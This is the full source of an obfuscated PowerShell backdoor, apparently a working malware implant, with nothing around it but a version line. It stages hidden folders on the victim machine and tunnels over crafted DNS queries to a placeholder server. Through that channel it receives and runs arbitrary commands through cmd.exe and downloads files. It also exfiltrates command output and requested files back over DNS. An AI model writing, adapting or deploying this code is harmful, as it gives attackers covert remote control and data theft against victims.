# version 2.2
$SSA = "<MALICIOUS SERVER>";
$TTA = $env:PUBLIC + "\Libraries";
if (-not (Test-Path $TTA)) { md $TTA; }
$UUA = $TTA + "\quid";

$VVA = $TTA + "\lock";
if (!(Test-Path $VVA)){sc -Path $VVA -Value $pid;}
else
{
	$WWA = (NEW-TIMESPAN -Start ((Get-ChildItem $VVA).CreationTime) -End (Get-Date)).Minutes
	if ($WWA -gt 10)
	{
		stop-process -id (gc $VVA);
		ri -Path $VVA;
	}
	return;
}

$XXA = get-content $UUA;
$YYA = Get-Random -InputObject (10 .. 99);
if ($XXA.length -ne 10) { $XXA = $YYA.ToString() + [guid]::NewGuid().toString().replace('-', '').substring(0, 8); $XXA | sc $UUA }
gi $UUA -Force | %{ $_.Attributes = "Hidden" }
${global:$ZZA} = 0;

function AAB ($BBB, $CCB, $DDB, $EEB, $FFB, $GGB)
{
	$HHB = -join ((48 .. 57)+(65 .. 70) | Get-Random  -Count (%{ Get-Random -InputObject (1 .. 7) }) | %{ [char]$_ });
	$IIB = Get-Random -InputObject (0 .. 9) -Count 2;
	$JJB = $XXA.Insert(($IIB[1]), $CCB).Insert($IIB[0], $BBB);
	if ($FFB -eq "s")
	{ return "$($JJB)$($GGB)$($HHB)C$($IIB[0])$($IIB[1])T.$DDB.$EEB.$SSA"; }
	else 
	{ return "$($JJB)$($GGB)$($HHB)C$($IIB[0])$($IIB[1])T.$($SSA)";}
}

function KKB()
{
	$LLB = $null;
	try
	{
		$LLB = ((Get-WmiObject Win32_NetworkAdapterConfiguration -ComputerName $env:computername -EA Stop | ? { $_.IPEnabled }).DNSServerSearchOrder)[0] | Out-String
	}
	catch [exception] {
		#Write-Host $_.Message
	}
	if (!$LLB)
	{
		try
		{
			$ns = nslookup.exe 8.8.8.8;
			$LLB = ($ns[1] -split ':')[1].Trim();
		}
		catch [exception] {
			#Write-Host $_.Message
		}
	}
	return $LLB
}

function MMB ($NNB)
{
	$ip = KKB
	$ars = [system.net.IPAddress]::Parse([System.Net.Dns]::GetHostAddresses($SSA));
	$end = New-Object System.Net.IPEndPoint $ars, 53
	$s = New-Object System.Net.Sockets.UdpClient
	$s.Client.ReceiveTimeout = $s.Client.SendTimeout = 15000
	$s.Connect($end)
	$pre = (0xa4, 0xa3, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
	if (!$NNB.StartsWith('.')) { $NNB = "." + $NNB; }
	if (!$NNB.EndsWith('.')) { $NNB = $NNB + "."; }
	$mb = [System.Text.Encoding]::ASCII.GetBytes($NNB)
	$p = $NNB.Split('.')
	$pi = 1
	for ($i = 0; $i -lt $mb.length; $i++) { if ($mb[$i] -eq 0x2e) { $mb[$i] = $p[$pi].Length; $pi++ } }
	$pre += $mb
	$pre += (0x00, 0x10, 0x00, 0x01)
	$buf = $pre
	$Sent = $s.Send($buf, $buf.Length)
	$rb = $s.Receive([ref]$end)
	$r = [byte[]]( ,0x0 * ($rb.length - ($mb.length + 29)))
	[System.Buffer]::BlockCopy($rb, $mb.length + 29, $r, 0, ($rb.length - ($mb.length + 29)))
	return $r
}

function OOB ($NNB)
{
	$ip = KKB
	$ars = [system.net.IPAddress]::Parse([System.Net.Dns]::GetHostAddresses($SSA));
	$end = New-Object System.Net.IPEndPoint $ars, 53
	$s = New-Object System.Net.Sockets.UdpClient
	$s.Client.ReceiveTimeout = $s.Client.SendTimeout = 15000
	$s.Connect($end)
	$pre = (0xa4, 0xa3, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
	if (!$NNB.StartsWith('.')) { $NNB = "." + $NNB; }
	if (!$NNB.EndsWith('.')) { $NNB = $NNB + "."; }
	$mb = [System.Text.Encoding]::ASCII.GetBytes($NNB)
	$p = $NNB.Split('.')
	$pi = 1
	for ($i = 0; $i -lt $mb.length; $i++) { if ($mb[$i] -eq 0x2e) { $mb[$i] = $p[$pi].Length; $pi++ } }
	$pre += $mb
	$pre += (0x00, 0x01, 0x00, 0x01)
	$buf = $pre
	$Sent = $s.Send($buf, $buf.Length)
	$rb = $s.Receive([ref]$end)
	$r = [byte[]]( ,0x0 * ($rb.length - ($mb.length + 28)))
	[System.Buffer]::BlockCopy($rb, $mb.length + 28, $r, 0, ($rb.length - ($mb.length + 28)))
	return $r
}

function PPB
{
	$QQB = $false;
	$RRB = 0;
	$SSB = ${global:$TTB} + "\";
	$UUB = @();
	$VVB = "000";
	$WWB = "0";
	${global:$XXB} = $true;
	${global:$YYB} = 0;
	${global:$$ZZB} = 5;
	
	While (${global:$XXB})
	{
		Start-Sleep -m 50;
		if (${global:$YYB} -gt ${global:$$ZZB}) { break }
		if ($RRB -eq [int]$VVB) { ${global:$YYB}++ }
		if ($RRB -lt 10) { $VVB = "00$($RRB)"; }
		elseif ($RRB -lt 100) { $VVB = "0$($RRB)"; }
		else { $VVB = "$($RRB)"; }
		$AAC = AAB $VVB $WWB "" "" "r"
		try
		{
			Write-Host $AAC;
			$BBC = [System.Net.Dns]::GetHostAddresses($AAC);
			Write-Host $BBC;
		}
		catch [Exception]
		{
			echo $_.Exception.GetType().FullName, $_.Exception.Message; Write-Host "excepton occured!"; ${global:$YYB}++; continue;
		}
		
		if ($BBC -eq $null)
		{
			${global:$YYB} = ${global:$YYB} + 1;
			continue;
		}
		$CCC = $BBC[0].IPAddressToString.Split('.');
		Write-Host "$($RRB):$($CCC[3])`tsaveing_mode: $($QQB)`t   $($CCC[0]) $($CCC[1]) $($CCC[2])"
		if (($CCC[0] -eq 1) -and ($CCC[1] -eq 2) -and ($CCC[2] -eq 3))
		{
			$QQB = $false;
			$WWB = "0";
			$len = $UUB.Length
			if ($UUB[$len - 1] -eq 0 -and $UUB[$len - 2] -eq 0)
			{
				$DDC = $UUB[0 .. ($len - 3)];
			}
			elseif ($UUB[$len - 1] -eq 0)
			{
				$DDC = $UUB[0 .. ($len - 2)];
			}
			else
			{
				$DDC = $UUB;
			}
			[System.IO.File]::WriteAllBytes($SSB, $DDC);
			$UUB = @();
			$DDC = @();
			$RRB = 0;
			${global:$XXB} = $false;
		}
		
		if ($QQB)
		{
			if ($RRB -gt 250) { $RRB = 0; }
			if ($RRB -eq $CCC[3])
			{
				$UUB += $CCC[0];
				$UUB += $CCC[1];
				$UUB += $CCC[2];
				$RRB = $RRB + 3;
			}
		}
		
		if (($CCC[0] -eq 24) -and ($CCC[1] -eq 125))
		{
			$SSB += "rcvd" + $CCC[2] + "" + $CCC[3];
			$QQB = $true;
			$WWB = "1";
			$RRB = 0;
		}
		
		if (($CCC[0] -eq 11) -and ($CCC[1] -eq 24) -and ($CCC[2] -eq 237) -and ($CCC[3] -eq 110)) # kill this process
		{
			${global:$XXB} = $false;
			${global:$YYB} = ${global:$YYB} + 1;
		}
	}
	Start-Sleep -s 1;
}

function EEC
{
	$byts = @(); $ct = 0; $fb = @(); $rn = "000"; $FFC = "W"; $run = $true; $GGC = ${global:$TTB} + "\";
	$HHC = 0;
	While ($run)
	{
		Start-Sleep -m 50;
		if ($HHC -gt 5){ $run = $false; }
		if ($ct -lt 10){$rn = "000$($ct)";}
		elseif ($ct -lt 100){$rn = "00$($ct)";}
		elseif ($ct -lt 1000){$rn = "0$($ct)";}
		else{$rn = "$($ct)";}
		try
		{
			$IIC = AAB "000" $FFC "" "" "r" $rn
			$tmp = MMB($IIC);
			$res = [System.Text.Encoding]::ASCII.GetString($tmp);
		}
		catch [exception] { Write-Host $_; $HHC++; ${global:$ZZA}++; continue; }
		if ([string]::IsNullOrEmpty($res)) { $HHC++; ${global:$ZZA}++; continue;}
		$rs = $res.Split('>');
		$data = "";
		For ($i = 0; $i -le $rs[1].Length; $i++) { if ($rs[1][$i] -lt 125 -and $rs[1][$i] -gt 41) { $data += $rs[1][$i]; } }
		if ($rs[0][0] -eq "N")
		{
			$FFC = "W";
			$HHC++;
			continue;
		}
		if ($rs[0] -eq "S000s")
		{
			$HHC = 0;
			$FFC = "D";
			$GGC += ("rcvd"+$data);
			$ct = 0;
			continue;
		}
		if ($rs[0][0] -eq 'S' -and -not ($fb -contains $rs[0]))
		{
			$FFC = "D";
			if ($rs[0].EndsWith($rn))
			{
				try
				{
					$tmp = $data.Replace('-', '+').Replace('_', '/');
					$byts += [System.Convert]::FromBase64String($tmp);
					$ct++;
					$fb += $rs[0];
				}
				catch
				{
					Write-Host "Exception in receiver_"+$_;
				}
			}
		}
		if ($rs[0].StartsWith("E"))
		{
			[System.IO.File]::WriteAllBytes($GGC, $byts);
			break;
		}
		if ($rs[0].StartsWith("C"))
		{
			$ct = 0; $run = $false;
		}
	}
}

function JJC($KKC)
{
	$RRB = 0;
	$LLC = @(gci -path (${global:$MMC}+"\proc*") | ? { !$_.PSIsContainer });
	if ($LLC -ne $null)
	{
		
		$NNC = $LLC[0].ToString().Substring($LLC[0].ToString().Length - 5)
		$OOC = ${global:$MMC} + "\" + $NNC;
		rni $LLC[0] $OOC -Force
		$PPC = slaber $OOC;
		if ([int]$PPC.Length -le 0) { rd -path $OOC;return; }
		$QQC = 60;
		$RRC = "*" * 54;
		$RRC = Split-path $OOC -Leaf | % { $RRC.Insert(0, $_) } | % { $_.Insert(6, $PPC.Length) } | %{ $_[0 .. 26] -join "" };
		$RRC = -join ($RRC | % { resolver $_ })
		$SSC = "COCTab" + $RRC;
		$PPC = $SSC + $PPC;
		$TTC = "000";
		$WWB = "2";
		$UUC = 0;
		$VVC = $true;
		${global:$XXB} = $true;
		$WWC = $true;
		${global:$YYB} = 0;
		${global:$ZZB} = 5;
		
		While (${global:$XXB})
		{
			Start-Sleep -m 10;
			if (${global:$YYB} -gt ${global:$ZZB})
			{
				$XXC = ${global:$MMC} + "\proc" + $NNC;
				rni $OOC $XXC -Force;
				break;
			}
			
			if ($RRB -lt 10) { $TTC = "00$($RRB)"; }
			elseif ($RRB -lt 100) { $TTC = "0$($RRB)"; }
			else { $TTC = "$($RRB)"; }
			
			if ($RRB -eq 250)
			{
				if ($VVC)
				{
					$UUC += 250;
				}
				$RRB = 0; $VVC = $false;
			}
			if ($RRB -eq 200) { $VVC = $true; }
			
			if ($PPC.Length -gt $QQC)
			{
				if (($PPC.Length - $QQC * ($RRB + $UUC)) -ge $QQC)
				{
					$YYC = $PPC.Substring($QQC * ($RRB + $UUC), $QQC);
				}
				elseif (($PPC.Length - $QQC * ($RRB + $UUC)) -gt 0)
				{
					$YYC = $PPC.Substring($QQC * ($RRB + $UUC), ($PPC.Length - $QQC * ($RRB + $UUC)));
				}
				else
				{
					$YYC = "COCTabCOCT";
					${global:$XXB} = $false;
					rd -path $OOC -Force;
				}
			}
			else
			{
				$YYC = $PPC;
			}
			$ZZC = (Split-path $OOC -Leaf) + "*" | % { resolver $_ };
			$AAC = AAB $TTC $WWB $YYC $ZZC "s" "0000"
			try
			{
				if ($KKC -lt 3 -and -not ($AAD))
				{
					$BBC = OOB($AAC);
				}
				else
				{
					$BBC = [System.Net.Dns]::GetHostAddresses($AAC);
					$BBC = $BBC.IPAddressToString.Split('.')
				}
				Write-Host $BBC;
			}
			catch [exception] { Write-Host "excepton occured!"+$_; ${global:$YYB}++; continue; }
			
			if ($BBC -eq $null) { $WWC = $false; ${global:$YYB}++; continue }

			if (($BBC[0] -eq $XXA.Substring(0,2)) -and ($BBC[1] -eq 2) -and ($BBC[2] -eq 3))
			{
				$WWC = $false;
				$RRB = [int]$BBC[3];
			}
			
			if (($BBC[0] -eq 253) -and ($BBC[1] -eq 25) -and ($BBC[2] -eq 42) -and ($BBC[3] -eq 87)) # kill this process
			{
				$WWC = $false;
				$UUC = 0
				${global:$XXB} = $false;
				${global:$YYB} = ${global:$YYB} + 3;
				del $OOC;
			}
			
			if ($WWC)
			{
				${global:$YYB}++;
			}
		}
	}
}
function slaber ($BBD) {
	$f = gc $BBD -Encoding Byte;
	$e = resolver($f);
	return $e;
}
function resolver ($CCD) {
	$cnt = 0;
	$p1 = "";
	$p2 = "";
	for ($i = 0; $i -lt $CCD.Length; $i++)
	{
		if ($cnt -eq 30)
		{
			$cnt = 0;
			$res += ($p1 + $p2);
			$p1 = ""; $p2 = "";
		}
		$tmp = [System.BitConverter]::ToString($CCD[$i]).Replace("-", "");
		$p1 += $tmp[0];
		$p2 += $tmp[1];
		$cnt++;
	}
	$res += ($p1 + $p2);
	return $res;
}
function DDD
{
	$LLC = @(gci -path (${global:$TTB}+"\rcvd*") | ? { !$_.PSIsContainer });
	if ($LLC -ne $null)
	{
		$OOC = $LLC[0].ToString().Replace("rcvd", "proc")
		rni $LLC[0] $OOC -Force
		$EED = $OOC -replace "receivebox", "sendbox";
		if ($OOC.EndsWith("0"))
		{
			$FFD = gc $OOC | ? { $_.trim() -ne "" };
			$FFD = $FFD | ? { $_.trim() -ne "" }
			$GGD += ($FFD + " 2>&1") | % {Try { $_ | cmd.exe | Out-String }Catch { $_ | Out-String }}
			$GGD +"<>" | sc $EED -Encoding UTF8
			if (Test-path -path $OOC)
			{
				rd -path $OOC;
			}
		}
		elseif ($OOC.EndsWith("1"))
		{
			$HHD = gc $OOC | ? { $_.trim() -ne "" } | %{ $_.Replace("`0", "").Trim() }
			if (Test-path -path $HHD)
			{
				cpi -path $HHD -destination $EED -Force;
			}
			else
			{
				"File not exist" | sc $EED;
			}
			if (Test-path -path $OOC)
			{
				rd -path $OOC;
			}
		}
		else {
			$IID = $OOC -replace "receivebox", "done";
			mi -path $OOC -destination $IID -Force;
			if (Test-path -path $IID)
			{
				("200<>" + $IID) | sc $EED;
				rd -path $OOC;
			}
		}
		try
		{
			rd -path $OOC;
		}catch{}
	}
}

${global:$JJD} = $TTA + "\" + $XXA;
${global:$KKD} = $TTA + "\files";
${global:$TTB} = ${global:$JJD} + "\receivebox";
${global:$MMC} = ${global:$JJD} + "\sendbox";
${global:$LLD} = ${global:$JJD} + "\done";

if (-not (Test-Path ${global:$KKD})) { md ${global:$KKD}; }
if (-not (Test-Path ${global:$JJD}) -or -not (Test-Path ${global:$MMC}))
{
	md ${global:$JJD};
	md ${global:$MMC};
	md ${global:$TTB};
	md ${global:$LLD};
}
$MMD = AAB "000" "M" "" "" "r" $rn
$NND = [System.Net.Dns]::GetHostAddresses($MMD);
$AAD = $false;
if ($NND -eq "99.250.250.199")
{
	${global:$ZZA} = 0;
	EEC;
	if (${global:$ZZA} -gt 3)
	{
		$AAD = $true;
		$OOD = AAB "000" "P" "" "" "r" $rn
		[System.Net.Dns]::GetHostAddresses($OOD);
		PPB;
	}
}
else
{
	$AAD = $true;
	PPB;
}
DDD;
JJC(${global:$ZZA});
# remove lock file to next request
ri -Path $VVA;
